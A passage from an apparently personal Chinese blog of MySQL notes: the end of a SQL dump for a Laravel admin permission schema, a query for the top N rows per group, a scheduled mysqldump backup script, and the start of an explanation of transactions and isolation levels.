class="string">'编辑管理员'</span>,<span class="string">''</span>,<span class="string">'admin/admin/edit'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:42:33'</span>,<span class="string">'2019-05-20 18:42:33'</span>),</span><br><span class="line">	(<span class="number">29</span>,<span class="number">25</span>,<span class="string">'新增角色'</span>,<span class="string">''</span>,<span class="string">'admin/role/create'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:43:42'</span>,<span class="string">'2019-05-20 18:46:29'</span>),</span><br><span class="line">	(<span class="number">30</span>,<span class="number">25</span>,<span class="string">'编辑角色'</span>,<span class="string">''</span>,<span class="string">'admin/role/edit'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:44:21'</span>,<span class="string">'2019-05-20 18:46:30'</span>),</span><br><span class="line">	(<span class="number">36</span>,<span class="number">25</span>,<span class="string">'赋权'</span>,<span class="string">''</span>,<span class="string">'admin/role/permission'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:46:49'</span>,<span class="string">'2019-05-20 19:00:29'</span>),</span><br><span class="line">	(<span class="number">37</span>,<span class="number">25</span>,<span class="string">'赋权-提交'</span>,<span class="string">''</span>,<span class="string">'admin/role/updatePermission'</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:47:10'</span>,<span class="string">'2019-05-20 18:47:10'</span>),</span><br><span class="line">	(<span class="number">31</span>,<span class="number">26</span>,<span class="string">'新增权限'</span>,<span class="string">''</span>,<span class="string">'admin/permission/create'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:46:49'</span>,<span class="string">'2019-05-20 19:00:29'</span>),</span><br><span class="line">	(<span class="number">32</span>,<span class="number">26</span>,<span class="string">'编辑权限'</span>,<span class="string">''</span>,<span class="string">'admin/permission/edit'</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:47:10'</span>,<span class="string">'2019-05-20 18:47:10'</span>),</span><br><span class="line">	(<span class="number">33</span>,<span class="number">0</span>,<span class="string">'首页'</span>,<span class="string">''</span>,<span class="string">'admin/index'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">'2019-05-20 23:51:37'</span>,<span class="string">'2019-05-20 23:51:47'</span>),</span><br><span class="line">	(<span class="number">34</span>,<span class="number">26</span>,<span class="string">'新增权限-提交'</span>,<span class="string">''</span>,<span class="string">'admin/permission/store'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-21 14:38:36'</span>,<span class="string">'2019-05-21 14:38:36'</span>),</span><br><span class="line">	(<span class="number">35</span>,<span class="number">26</span>,<span class="string">'编辑权限-提交'</span>,<span class="string">''</span>,<span class="string">'admin/permission/update'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-21 14:38:57'</span>,<span class="string">'2019-05-21 14:38:57'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_permission` ENABLE KEYS */</span>;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table crm_admin_role</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS <span class="string">`crm_admin_role`</span>;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`crm_admin_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> varchar(<span class="number">50</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'角色名称'</span>,</span><br><span class="line">  <span class="string">`status`</span> tinyint(<span class="number">4</span>) NOT NULL DEFAULT <span class="number">1</span> COMMENT <span class="string">'状态 1=&gt;启用 0=&gt;禁用'</span>,</span><br><span class="line">  <span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">  <span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  UNIQUE KEY <span class="string">`unk_name`</span> (<span class="string">`name`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=<span class="string">'角色表'</span>;</span><br><span class="line"></span><br><span class="line">LOCK TABLES <span class="string">`crm_admin_role`</span> WRITE;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_role` DISABLE KEYS */</span>;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`crm_admin_role`</span> (<span class="string">`id`</span>, <span class="string">`name`</span>, <span class="string">`status`</span>, <span class="string">`created_at`</span>, <span class="string">`updated_at`</span>)</span><br><span class="line">VALUES</span><br><span class="line">	(<span class="number">1</span>,<span class="string">'超级管理员'</span>,<span class="number">1</span>,<span class="string">'2019-05-06 18:52:06'</span>,<span class="string">'2019-05-07 16:56:26'</span>),</span><br><span class="line">	(<span class="number">2</span>,<span class="string">'普通管理员'</span>,<span class="number">1</span>,<span class="string">'2019-05-06 18:52:29'</span>,<span class="string">'2019-05-06 18:52:29'</span>),</span><br><span class="line">	(<span class="number">8</span>,<span class="string">'开发'</span>,<span class="number">1</span>,<span class="string">'2019-05-20 16:50:40'</span>,<span class="string">'2019-05-20 16:50:40'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_role` ENABLE KEYS */</span>;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table crm_admin_role_permission</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS <span class="string">`crm_admin_role_permission`</span>;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`crm_admin_role_permission`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`role_id`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="string">`permission_id`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">  <span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_role_id`</span> (<span class="string">`role_id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_permission_id`</span> (<span class="string">`permission_id`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=<span class="string">'角色权限关联表'</span>;</span><br><span class="line"></span><br><span class="line">LOCK TABLES <span class="string">`crm_admin_role_permission`</span> WRITE;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_role_permission` DISABLE KEYS */</span>;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`crm_admin_role_permission`</span> (<span class="string">`id`</span>, <span class="string">`role_id`</span>, <span class="string">`permission_id`</span>, <span class="string">`created_at`</span>, <span class="string">`updated_at`</span>)</span><br><span class="line">VALUES</span><br><span class="line">	(<span class="number">12</span>,<span class="number">2</span>,<span class="number">20</span>,<span class="string">'2019-05-20 18:04:36'</span>,<span class="string">'2019-05-20 18:04:36'</span>),</span><br><span class="line">	(<span class="number">13</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="string">'2019-05-20 18:04:36'</span>,<span class="string">'2019-05-20 18:04:36'</span>),</span><br><span class="line">	(<span class="number">14</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="string">'2019-05-20 18:04:36'</span>,<span class="string">'2019-05-20 18:04:36'</span>),</span><br><span class="line">	(<span class="number">26</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">27</span>,<span class="number">1</span>,<span class="number">24</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">28</span>,<span class="number">1</span>,<span class="number">27</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">29</span>,<span class="number">1</span>,<span class="number">28</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">30</span>,<span class="number">1</span>,<span class="number">25</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">31</span>,<span class="number">1</span>,<span class="number">29</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">32</span>,<span class="number">1</span>,<span class="number">30</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">33</span>,<span class="number">1</span>,<span class="number">26</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">34</span>,<span class="number">1</span>,<span class="number">31</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">35</span>,<span class="number">1</span>,<span class="number">32</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">36</span>,<span class="number">1</span>,<span class="number">34</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">37</span>,<span class="number">1</span>,<span class="number">35</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">38</span>,<span class="number">1</span>,<span class="number">33</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">39</span>,<span class="number">1</span>,<span class="number">36</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>),</span><br><span class="line">	(<span class="number">40</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="string">'2019-05-21 14:39:34'</span>,<span class="string">'2019-05-21 14:39:34'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_role_permission` ENABLE KEYS */</span>;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table crm_admin_user</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS <span class="string">`crm_admin_user`</span>;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`crm_admin_user`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> varchar(<span class="number">32</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'登陆的用户名'</span>,</span><br><span class="line">  <span class="string">`email`</span> varchar(<span class="number">32</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'email'</span>,</span><br><span class="line">  <span class="string">`phone`</span> char(<span class="number">11</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'电话号码'</span>,</span><br><span class="line">  <span class="string">`password`</span> char(<span class="number">60</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'密码'</span>,</span><br><span class="line">  <span class="string">`status`</span> tinyint(<span class="number">4</span>) NOT NULL DEFAULT <span class="number">1</span> COMMENT <span class="string">'1 =&gt; 启用 0=&gt;禁用'</span>,</span><br><span class="line">  <span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">  <span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  <span class="string">`deleted_at`</span> datetime DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  UNIQUE KEY <span class="string">`uk_email`</span> (<span class="string">`email`</span>) USING BTREE</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=<span class="string">'管理员信息表'</span>;</span><br><span class="line"></span><br><span class="line">LOCK TABLES <span class="string">`crm_admin_user`</span> WRITE;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_user` DISABLE KEYS */</span>;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`crm_admin_user`</span> (<span class="string">`id`</span>, <span class="string">`username`</span>, <span class="string">`email`</span>, <span class="string">`phone`</span>, <span class="string">`password`</span>, <span class="string">`status`</span>, <span class="string">`created_at`</span>, <span class="string">`updated_at`</span>, <span class="string">`deleted_at`</span>)</span><br><span class="line">VALUES</span><br><span class="line">	(<span class="number">27</span>,<span class="string">'li12312'</span>,<span class="string">'1234@qq.com'</span>,<span class="string">'15111179935'</span>,<span class="string">'$2y$10$LFQrR5PWcsxSTYhNYG1tK.IipQHjiJsVakluH4F0iDK50rtUTMVfq'</span>,<span class="number">1</span>,<span class="string">'2019-05-20 00:17:56'</span>,<span class="string">'2019-05-20 11:45:59'</span>,NULL);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_user` ENABLE KEYS */</span>;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table crm_admin_user_role</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS <span class="string">`crm_admin_user_role`</span>;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`crm_admin_user_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`user_id`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="string">`role_id`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">  <span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_user_id`</span> (<span class="string">`user_id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_role_id`</span> (<span class="string">`role_id`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=<span class="string">'用户角色关联表'</span>;</span><br><span class="line"></span><br><span class="line">LOCK TABLES <span class="string">`crm_admin_user_role`</span> WRITE;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_user_role` DISABLE KEYS */</span>;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`crm_admin_user_role`</span> (<span class="string">`id`</span>, <span class="string">`user_id`</span>, <span class="string">`role_id`</span>, <span class="string">`created_at`</span>, <span class="string">`updated_at`</span>)</span><br><span class="line">VALUES</span><br><span class="line">	(<span class="number">1</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="string">'2019-05-07 15:45:55'</span>,<span class="string">'2019-05-07 15:45:55'</span>),</span><br><span class="line">	(<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">'2019-05-07 16:33:18'</span>,<span class="string">'2019-05-07 16:33:18'</span>),</span><br><span class="line">	(<span class="number">13</span>,<span class="number">27</span>,<span class="number">1</span>,<span class="string">'2019-05-20 10:37:04'</span>,<span class="string">'2019-05-20 10:37:04'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_user_role` ENABLE KEYS */</span>;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">https:<span class="comment">//github.com/tsmliyun/laravel_quick_admin</span></span><br></pre></td></tr></table></figure>
<h3 id="取分组数据的前N条纪录"><a href="#取分组数据的前N条纪录" class="headerlink" title="取分组数据的前N条纪录"></a>取分组数据的前N条纪录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tbl ( cate  varchar(<span class="number">10</span>), item  int, note varchar(<span class="number">20</span>));</span><br><span class="line">INSERT INTO tbl VALUES</span><br><span class="line">    (<span class="string">'a'</span>, <span class="number">2</span>, <span class="string">'a的第二个值'</span>),</span><br><span class="line">    (<span class="string">'a'</span>, <span class="number">1</span>, <span class="string">'a的第一个值'</span>),</span><br><span class="line">    (<span class="string">'a'</span>, <span class="number">3</span>, <span class="string">'a的第三个值'</span>),</span><br><span class="line">    (<span class="string">'b'</span>, <span class="number">1</span>, <span class="string">'b的第一个值'</span>),</span><br><span class="line">    (<span class="string">'b'</span>, <span class="number">3</span>, <span class="string">'b的第三个值'</span>),</span><br><span class="line">    (<span class="string">'b'</span>, <span class="number">2</span>, <span class="string">'b的第二个值'</span>),</span><br><span class="line">    (<span class="string">'b'</span>, <span class="number">4</span>, <span class="string">'b的第四个值'</span>),</span><br><span class="line">    (<span class="string">'b'</span>, <span class="number">5</span>, <span class="string">'b的第五个值'</span>);</span><br><span class="line">取每个 cate item 最大/最小的那条记录</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT a.* FROM tbl a WHERE item = (</span><br><span class="line">    -&gt; SELECT MAX(item) FROM tbl WHERE cate = a.cate</span><br><span class="line">    -&gt; ) ORDER BY a.cate;</span><br><span class="line">+------+------+------------------+</span><br><span class="line">| cate | item | note             |</span><br><span class="line">+------+------+------------------+</span><br><span class="line">| a    |    <span class="number">3</span> | a的第三个值      |</span><br><span class="line">| b    |    <span class="number">5</span> | b的第五个值      |</span><br><span class="line">+------+------+------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.01</span> sec)</span><br><span class="line">按 cate 分组取最大/最小的两个(N个)item</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT a.* FROM tbl a WHERE EXISTS (</span><br><span class="line">    -&gt; SELECT COUNT(*) FROM tbl</span><br><span class="line">    -&gt; WHERE cate = a.cate AND item &lt; a.item HAVING COUNT(*) &lt; <span class="number">2</span></span><br><span class="line">    -&gt; ) ORDER BY a.cate, a.item;</span><br><span class="line">+------+------+------------------+</span><br><span class="line">| cate | item | note             |</span><br><span class="line">+------+------+------------------+</span><br><span class="line">| a    |    <span class="number">1</span> | a的第一个值      |</span><br><span class="line">| a    |    <span class="number">2</span> | a的第二个值      |</span><br><span class="line">| b    |    <span class="number">1</span> | b的第一个值      |</span><br><span class="line">| b    |    <span class="number">2</span> | b的第二个值      |</span><br><span class="line">+------+------+------------------+</span><br><span class="line"><span class="number">4</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">select </span><br><span class="line"><span class="keyword">from</span> table a</span><br><span class="line">where <span class="number">2</span>&gt;(select count() <span class="keyword">from</span> table where bind_category_id=a.bind_category_idand created_at&gt;a.created_at)</span><br><span class="line">order by a.bind_category_idand ,a.created_at desc</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/36766</span></span><br><span class="line">https:<span class="comment">//n3xtchen.github.io/n3xtchen/postgresql/2015/08/13/pgsql-vs-mysql-get-nth-value-per-group</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-定时备份"><a href="#MySQL-定时备份" class="headerlink" title="MySQL 定时备份"></a>MySQL 定时备份</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">backupdir=<span class="regexp">/data/</span>backup</span><br><span class="line">time=<span class="string">`date +%Y-%m-%d-%H-%M`</span></span><br><span class="line"><span class="keyword">if</span>  [ ! -e  /data/backcup  ];then</span><br><span class="line"> mkdir  -p  /data/backup</span><br><span class="line">fi</span><br><span class="line">/usr/bin/mysqldump  --single-transaction  --flush-logs --skip-add-drop-table  -uroot  -p<span class="string">'root@xx'</span>  数据库  |bzip2 &gt; $backupdir/数据库$time.sql.bz2</span><br><span class="line"></span><br><span class="line"># 清理超过7天没使用的文件</span><br><span class="line">find $backupdir -name <span class="string">"数据库*.sql.bz2"</span> -type f -mtime +<span class="number">7</span> -exec rm &#123;&#125; \; &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">批注：</span><br><span class="line">--single-transaction参数的作用，设置事务的隔离级别为可重复读，即REPEATABLE READ，这样能保证在一个事务中所有相同的查询读取到同样的数据，也就大概保证了在dump期间，如果其他innodb引擎的线程修改了表的数据并提交，对该dump线程的数据并无影响</span><br><span class="line">--skip-add-drop-table  ---取消每个数据表创建之前添加drop数据表语句(默认每个表之前存在drop语句)</span><br><span class="line">--flush-logs  在开始导出前刷新服务器的日志文件</span><br><span class="line">最后导出的数据库备份文件 就是这个 xx2019<span class="number">-11</span><span class="number">-14</span><span class="number">-02</span><span class="number">-00.</span>sql.bz2</span><br><span class="line">mysql -u 用户名 -p密码 数据库名 &lt; 备份文件.sql  恢复某个节点数据</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36965</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQl事务最全详解"><a href="#MySQl事务最全详解" class="headerlink" title="MySQl事务最全详解"></a>MySQl事务最全详解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">MySQL 中的事务有如下几个特点(ACID):</span><br><span class="line"></span><br><span class="line">原子性(atomicity):</span><br><span class="line"></span><br><span class="line">一个事务必须被作为一个不可分割的最小工作单元,每个事务中的所有操作必须要么成功,或者要么失败,永远不可能一些操作失败,一些操作成功,这就是所谓的原子性的概念.</span><br><span class="line"></span><br><span class="line">一致性(consistency):</span><br><span class="line"></span><br><span class="line">一致性就像上面举的一个例子一样,当发生异常情况下,数据仍然是正确的.就是说当一个事务执行失败了,数据之间是不会受异常的情况而影响,永远保持着他的正确性.</span><br><span class="line"></span><br><span class="line">隔离性(isolation):</span><br><span class="line"></span><br><span class="line">当一个事务还未提交,每个事务之间是相互隔离的,互补受到影响.</span><br><span class="line"></span><br><span class="line">持久性(durability):</span><br><span class="line"></span><br><span class="line">当一个事务进行提交之后,发生的变化就会永远保存在数据库中.</span><br><span class="line"></span><br><span class="line">事务的隔离级别</span><br><span class="line"></span><br><span class="line">可重复读(REPEATABLE READ)</span><br><span class="line"></span><br><span class="line">多次读取记录的结果都是一致的,可重复读可以解决上面的不可重复读的情况.但是有这样一种情况,当一个事务在读取某个范围的记录时,另外一个事务在这个范围内插入了一条新的数据,当事务再次进行读取数据时,发现比第一次读取记录多了一条,这就是所谓的幻读,两次读取的结果不一致.</span><br><span class="line"></span><br><span class="line">举例:小明女朋友在查看银行卡的记录时,看见有 <span class="number">5</span> 条消费记录,此时小明正在消费,这时候消费记录里面记录了这条消费记录,当女朋友再次读取记录时,发现有 <span class="number">6</span> 条记录了.</span><br><span class="line">MySQL 中事务隐式开启的,也就是说,一个 sql 语句就是一个事务,当 sql 语句执行完毕,事务就提交了.在演示的过程中,我们显式开启  上面提到了 MySQL 中事务是隐式开启的,则代表我们每一个 sql 是自动提交的,需要关闭则需要设置 autocommit 选项</span><br><span class="line"></span><br><span class="line">show variables like <span class="string">'%autocommit%'</span>;set autocommit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看当前的事务隔离级别</span></span><br><span class="line"></span><br><span class="line">mysql root@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:test&gt; select @@tx_isolation;</span><br><span class="line"><span class="comment">// 连接MySQL</span></span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>, <span class="string">'root'</span>, <span class="string">'123456'</span>, <span class="string">'test'</span>, <span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭事务自动提交</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;autocommit(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.开启事务</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;begin_transaction();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.修改数据</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"update user set age=10 where id=1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.查看数据</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"select * from user"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.事务回滚</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;rollback();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.查看数据</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"select * from user"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7.修改数据</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"update user set age=15 where id=1"</span>);</span><br><span class="line"></span><br><span 